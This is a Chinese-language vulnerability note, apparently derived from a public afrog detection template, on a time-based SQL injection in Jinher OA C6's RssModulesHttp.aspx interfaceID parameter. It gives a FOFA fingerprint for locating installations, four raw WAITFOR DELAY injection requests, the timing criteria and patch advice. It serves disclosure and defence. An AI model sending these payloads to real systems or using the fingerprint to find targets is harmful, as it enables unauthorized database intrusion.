---
source: "https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinher-c6-rssmoduleshttp-sqli.yaml"
fofa: "app=\"金和网络-金和OA\""
version: "未知"
---

# 金和OA RssModulesHttp.aspx SQL注入漏洞

## 漏洞描述

afrog 公开模板记录金和 OA C6 的 `RssModulesHttp.aspx` SQL 注入检测，输入位置为 `interfaceID`。

## 影响版本与前提

金和 OA C6；确切受影响版本、修复版本及不同部署的鉴权条件未知。来源模板的请求未提供业务登录凭据；这不等于所有部署均可未授权利用。

## 网络测绘

```text
app="金和网络-金和OA"
```

## 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
```

## 判定与证据边界

上游按 10 秒、6 秒、10 秒、6 秒发起四次请求；每次均要求 HTTP 200，10 秒组耗时在 10–12 秒，6 秒组耗时在 6–8 秒，并且四项同时成立。需再结合正常响应基线排除网络与负载波动。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

## 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。修复对应查询的输入拼接，使用参数化查询，并限制数据库账户权限。

## 参考来源

- [公开检测模板](https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinher-c6-rssmoduleshttp-sqli.yaml)
